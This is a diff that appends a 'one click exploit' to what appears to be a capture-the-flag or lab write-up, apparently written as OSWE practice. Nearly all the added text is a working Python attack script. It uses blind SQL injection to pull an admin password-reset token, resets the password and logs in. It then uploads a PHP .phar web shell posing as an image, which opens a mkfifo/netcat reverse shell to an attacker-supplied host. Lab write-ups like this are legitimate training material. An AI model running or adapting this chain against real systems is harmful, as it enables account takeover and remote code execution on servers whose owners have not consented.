@@ -107,3 +107,64 @@ mkfifo worked for a reverse shell
 
 And that's the end of the box, no root for this.
 I might revisit this and write full one click exploits in python. Seems like good practice for the OSWE
+
+___
+
+A few weeks later I'm here again. This one was pretty hard, but here's the one click exploit
+
+````
+import sys, requests
+
+def main():
+	session = requests.Session()
+	token = ''
+	# Request a token
+	url = server + "/login/resetPassword.php"
+	data = "username=admin"
+	s = requests.Session()
+	headers = {"Content-Type":"application/x-www-form-urlencoded"}
+	s.post(url,data, headers=headers)
+
+	url = server + "/item/viewItem.php"
+	# Blind, time based SQLi to extract password reset token
+	for digit in range(1,17):
+			for char in range(1, 150):
+				param = {"id": "1 and ascii(substr((select token from user where id = 1)," + str(digit) + ",1)) = " + str(char) + " -- -" }
+				s = requests.Session()
+				x = s.get(url, params=param, allow_redirects=False)
+				if x.status_code == 404:
+					token = token + str(chr(char))
+	print("\n"+"\n"+"[*] Admin Token : " + token)
+
+	# Request password change to 'admin'
+	url = server + "/login/doChangePassword.php?token="+token+"&password=pwd"
+	print("\n"+"\n"+"[*] Resetting password @ "+ url + " ...")
+	s.get(url)
+
+	# Login
+	s.cookies.clear()
+	url = server + "/login/checkLogin.php"
+	data = "username=admin&password=pwd"
+	headers = {"Content-Type":"application/x-www-form-urlencoded"}
+	s.post(url, data=data, headers=headers)
+
+	# Upload shell
+	url = server + "/item/newItem.php"
+	files = {'id_user': (None, '1'), 'name': (None, 'rce'), 'image': ('rce.phar', 'GIF89a; <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc '+attacker+' '+port+' >/tmp/f"); ?>', 'image/png'), 'description': (None, 'rce'), 'price': (None, '1')}
+	s.post(url, files=files, cookies=s.cookies)
+
+	# RCE
+	url = server + "/item/image/rce.phar"
+	s.get(url)
+
+if __name__ == '__main__':
+	try:
+		server = sys.argv[1].strip()
+		attacker = sys.argv[2].strip()
+		port = sys.argv[3].strip()
+	except:
+		print("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
+		sys.exit()
+	print("Don't forget to open the listener on port {}!".format(port))
+	main()
+````
